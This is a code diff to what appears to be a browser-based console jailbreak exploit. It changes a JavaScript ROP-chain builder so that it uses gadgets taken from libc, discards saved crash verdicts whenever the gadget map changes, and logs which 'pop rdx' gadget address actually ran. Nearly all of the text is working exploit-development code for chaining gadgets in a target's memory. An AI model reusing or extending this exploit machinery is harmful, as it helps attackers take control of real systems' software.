@@ -409,7 +409,7 @@ async function prepare(p) {
        cache-buster, so a reload can serve a stale page that still references an
        old main.js -- twice now a run has been analysed as if it contained a
        change it did not. Stamp the build on screen so that is never in doubt. */
-    jbmark("BUILD", "main.js v=50 | if this is not the version just"
+    jbmark("BUILD", "main.js v=51 | if this is not the version just"
         + " pushed, the console is running a CACHED page and the run means"
         + " nothing -- force a reload");
 
@@ -1479,6 +1479,8 @@ async function prepare(p) {
         gadgets: gadgets
     };
 
+    p2.LC_SOURCED = LC_SOURCED;
+
     let chain = new worker_rop(p2);
 
     const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
@@ -1563,6 +1565,30 @@ async function prepare(p) {
            run that finds one still set knows that step killed the last run and
            skips it. */
         ps.au = ps.au || {};
+        /* A FAULT verdict is only valid for the chain that produced it. v=49
+           died at mp-lk because `pop rdx` was broken, which marked the
+           libkernel read as FAULT -- and that verdict then survived the fix
+           and skipped the read forever, which is why 0x1AF and 0x2AF were
+           still missing after pop rdx started working. So stamp the audit
+           state with the gadget map and discard it whenever that changes:
+           what crashed a chain says nothing about a different chain. */
+        const auSig = (function () {
+            let src = Object.keys(wk_gadgetmap).sort()
+                .map(k => k + ":" + wk_gadgetmap[k]).join(",");
+            if (typeof lc_gadgetmap !== "undefined")
+                src += "|" + Object.keys(lc_gadgetmap).sort()
+                    .map(k => k + ":" + lc_gadgetmap[k]).join(",");
+            let h = 0;
+            for (let z = 0; z < src.length; z++)
+                h = ((h * 31 + src.charCodeAt(z)) & 0x7fffffff);
+            return h;
+        })();
+        if (ps.auSig !== auSig) {
+            const n = Object.keys(ps.au).length;
+            ps.au = {}; ps.auSig = auSig;
+            if (n) jbmark("AUDIT-RESET", "the gadget map changed -- discarded "
+                + n + " verdict(s), including any FAULT the old chain caused");
+        }
         for (const k in ps.au) if (ps.au[k] === "doing") ps.au[k] = "FAULT";
         psSave();
         const auStep = (k) => {
@@ -1870,12 +1896,18 @@ async function prepare(p) {
                     chain.push(gadgets["pop rdx"]); chain.push(V0);
                     chain.push(gadgets["pop rax"]); chain.push(M0);
                 }, (v) => v.low === M0.low && v.hi === M0.hi);
-                jbmark("POP-RDX", "0x" + wk_gadgetmap["pop rdx"].toString(16)
-                    + " => " + (ps.gt["exec:pop rdx"] || "?")
-                    + (ps.gt["exec:pop rdx"] === "ok"
-                        ? " -- that region IS live code, so the bad gadgets are"
-                        + " mislocated rather than pointing into data"
-                        : ""));
+                /* Name the address that RAN. pop rdx comes from libc now, so
+                   printing wk_gadgetmap's 0x21461c next to "ok" credits the
+                   gadget that does not work with the result of the one that
+                   does -- exactly the kind of thing that cost eight runs
+                   earlier in this port. */
+                const src = LC_SOURCED["pop rdx"]
+                    ? "lc+0x" + lc_gadgetmap["pop rdx"].toString(16)
+                    : "wk+0x" + wk_gadgetmap["pop rdx"].toString(16);
+                jbmark("POP-RDX", src + " => " + (ps.gt["exec:pop rdx"] || "?")
+                    + (LC_SOURCED["pop rdx"]
+                        ? " (wk+0x" + wk_gadgetmap["pop rdx"].toString(16)
+                        + " is still bad -- this is libc's)" : ""));
             }
 
             /* Syscalls first, because they are the most informative test left
@@ -2011,4 +2043,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=50`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=51`);
